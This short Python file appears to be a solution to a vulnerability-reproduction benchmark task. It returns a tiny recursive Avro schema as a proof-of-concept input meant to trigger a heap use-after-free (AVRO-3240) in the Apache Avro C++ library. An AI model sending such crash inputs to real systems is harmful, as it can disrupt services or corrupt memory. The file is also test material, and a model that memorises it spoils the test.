import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (OSS-Fuzz issue 41356, AVRO-3240) is a Heap Use After Free in 
        Apache Avro C++ library, occurring when Node::add throws an exception (e.g. during 
        recursive schema definition handling or duplicate fields).
        
        The canonical PoC is a minimal recursive record schema.
        """
        # Minimal recursive record schema (approx 63 bytes)
        # {"type":"record","name":"n","fields":[{"name":"f","type":"n"}]}
        return b'{"type":"record","name":"n","fields":[{"name":"f","type":"n"}]}'
